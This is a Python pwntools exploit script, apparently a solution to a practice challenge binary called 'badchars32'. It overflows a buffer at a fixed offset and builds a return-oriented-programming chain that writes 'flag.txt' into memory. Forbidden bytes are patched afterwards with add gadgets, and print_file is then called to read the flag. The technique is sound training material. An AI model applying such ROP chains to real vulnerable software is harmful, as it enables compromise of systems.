import time
from typing import List

from pwn import *


EXECUTABLE = "./badchars32"
context.binary = elf = ELF(EXECUTABLE)
lib_badchars = ELF("./libbadchars32.so")


p = process(EXECUTABLE)

OFFSET = 44
if OFFSET is None:
    p.sendafter(b"> ", cyclic(128))

    time.sleep(1)
    core = Coredump("./core")
    log.success(f"Core fault address at: {hex(core.fault_addr)}")
    log.info(f"Finding offset for {hex(core.fault_addr)}")
    offset = cyclic_find(core.fault_addr)
    log.success(f"Offset found: {offset}")
    exit()

flag_addr = elf.symbols.data_start

file_name = b"flag.txt"
bad_chars = [b'a', b'g', b'x', b'.']


rop = ROP(elf, badchars=b''.join(bad_chars))

def rop_string(addr: int, string: bytes, badchars: List[bytes] = []) -> bytes:
    gadgets = {
        "move": elf.symbols.usefulGadgets + 0x0c, # mov qword ptr [edi], esi; ret;
        "add":  elf.symbols.usefulGadgets,        # add byte ptr [ebp], bl; ret;
    }
    place_string  = ROP(elf, badchars=b''.join(badchars))
    fix_bad_chars = ROP(elf, badchars=b''.join(badchars))

    # Add null byte
    if string[-1] != b'\x00':
        string = string + b'\x00'
    # Pad string
    if len(string) % context.bytes != 0:
        string = string + b'\x00' * (context.bytes - (len(string) % context.bytes))

    for i in range(len(string) // context.bytes):
        string_part = string[i*context.bytes:(i+1)*context.bytes]

        fixed_string = b""
        for j, c in enumerate(string_part):
            c = c.to_bytes(1, byteorder="little")
            if c in badchars:
                fixed_string = fixed_string + b"A"

                # Fix this char
                fix_bad_chars(ebx=(ord(c) - ord(b'A')) % 256, ebp=addr + (i*context.bytes) + j)
                fix_bad_chars.raw(gadgets["add"])
            else:
                fixed_string = fixed_string + c

        # Place the string
        place_string(esi=fixed_string, edi=addr + i*context.bytes)
        place_string.raw(gadgets["move"])

    log.debug("Place string chain:\n" + place_string.dump())
    log.debug("Fix bad chars chain:\n" + fix_bad_chars.dump())

    return place_string.chain() + fix_bad_chars.chain()


# Load string into memory
rop.raw(rop_string(flag_addr, file_name, bad_chars))
# Call print_file
rop.print_file(flag_addr)


log.debug("Sending rop chain:\n" + rop.dump())
p.sendafter(b"> ", flat({ OFFSET: rop.chain() }))
p.recvline() # Thank you

flag = str(p.recvline(), "UTF-8")
log.success(f"Flag: {flag}")
